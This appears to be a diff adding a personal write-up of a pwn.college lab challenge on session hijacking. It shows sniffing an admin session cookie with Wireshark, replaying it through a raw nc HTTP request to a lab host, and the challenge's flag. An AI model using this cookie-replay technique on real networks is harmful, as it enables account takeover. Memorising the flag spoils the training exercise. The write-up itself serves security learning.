@@ -1,0 +1,18 @@
+📅 2026-07-22
+
+opened in desktop
+opened terminal
+/challenge/run
+tmux
+wireshark -> inspected the traffic: endpoint=/ping in 10.0.0.2 port=80. stole the cookie session: session=eyJ1c2VyIjoiYWRtaW4ifQ.amEing.FPu69AN_mbviumDbrV1btkoqwZs
+nc -v 10.0.0.2 80
+GET /flag HTTP/1.1
+Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.amEing.FPu69AN_mbviumDbrV1btkoqwZs
+
+flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+how to steal cookie session with wireshark and use it to craft a authenticated request to an host
+
+## 🏁 Flag  
+pwn.college{omeMCTVau6fsGjqFIk1V73-m-Sb.0VM0AjNxwCO4IDOxEzW}
